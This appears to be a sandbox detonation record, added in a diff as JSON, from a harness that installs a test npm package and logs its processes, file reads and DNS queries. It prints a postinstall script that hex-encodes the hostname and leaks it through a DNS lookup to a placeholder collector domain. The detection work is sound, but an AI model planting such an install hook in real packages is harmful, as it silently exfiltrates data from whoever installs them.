@@ -1,0 +1,97 @@
+{
+ "job_id": "ac478650-f876-498c-bab7-ad919bfe2549",
+ "status": "completed",
+ "exit_code": 0,
+ "duration_s": 2.95,
+ "exec_events": [
+  {
+   "ts": "2026-11-03T22:30:56.568530110Z",
+   "pid": 287246,
+   "ppid": 287223,
+   "binary": "/usr/local/bin/docker-entrypoint.sh",
+   "args": "/usr/local/bin/docker-entrypoint.sh /bin/sh -c \"/bin/true pre-38cca4ca135933ca; \"$@\"; rc=$?; /bin/true post-38cca4ca135933ca; exit $rc\" detonator-witness npm install --no-audit --no-fund --prefix payloads/bc08-dns-exfil",
+   "parent_binary": "/usr/bin/containerd-shim-runc-v2",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:30:56.573366436Z",
+   "pid": 287286,
+   "ppid": 287246,
+   "binary": "/usr/local/bin/npm",
+   "args": "node /usr/local/bin/npm install --no-audit --no-fund --prefix payloads/bc08-dns-exfil",
+   "parent_binary": "/bin/sh",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:30:56.574029098Z",
+   "pid": 287286,
+   "ppid": 287286,
+   "binary": "/usr/local/bin/node",
+   "args": "/usr/local/bin/npm install --no-audit --no-fund --prefix payloads/bc08-dns-exfil",
+   "parent_binary": "/usr/local/bin/npm",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:30:57.032215295Z",
+   "pid": 287305,
+   "ppid": 287286,
+   "binary": "/usr/bin/sh",
+   "args": "-c \"node scripts/setup.js\"",
+   "parent_binary": "/usr/local/bin/node",
+   "uid": 10001,
+   "cwd": "/work/payloads/bc08-dns-exfil"
+  },
+  {
+   "ts": "2026-11-03T22:30:57.033190182Z",
+   "pid": 287306,
+   "ppid": 287305,
+   "binary": "/usr/local/bin/node",
+   "args": "scripts/setup.js",
+   "parent_binary": "/usr/bin/sh",
+   "uid": 10001,
+   "cwd": "/work/payloads/bc08-dns-exfil"
+  }
+ ],
+ "connect_events": [],
+ "dns_queries": [
+  {
+   "ts": "2026-11-03T22:30:57Z",
+   "domain": "613334386439643930336132.collector.invalid",
+   "answers": []
+  }
+ ],
+ "file_events": [
+  {
+   "ts": "2026-11-03T22:30:56.691963004Z",
+   "pid": 287286,
+   "binary": "/usr/local/bin/node",
+   "path": "/home/runner/.npmrc"
+  }
+ ],
+ "executed_scripts": [
+  {
+   "path": "/work/payloads/bc08-dns-exfil/scripts/setup.js",
+   "package": null,
+   "sha256": "a26356dbaf6f1868eb131600930bd30a2a7173b8fcdd33a7089ea598eaa4e6a1",
+   "content": "const dns = require(\"dns\"), os = require(\"os\");\n// The hostname is encoded into a DNS query; no HTTP request is ever made.\nconst label = Buffer.from(os.hostname()).toString(\"hex\").slice(0, 48);\ndns.lookup(label + \".collector.invalid\", () => {});\n",
+   "truncated": false
+  }
+ ],
+ "decoys": {},
+ "stdout_tail": "\n> bc08@1.0.0 postinstall\n> node scripts/setup.js\n\n\nup to date in 408ms\n",
+ "stderr_tail": "",
+ "truncated": false,
+ "error": null,
+ "sensor": {
+  "pre_seen": true,
+  "post_seen": true
+ },
+ "resources": {
+  "cpu_s": 0.64,
+  "peak_memory_mb": 38.6,
+  "samples": 2
+ }
+}
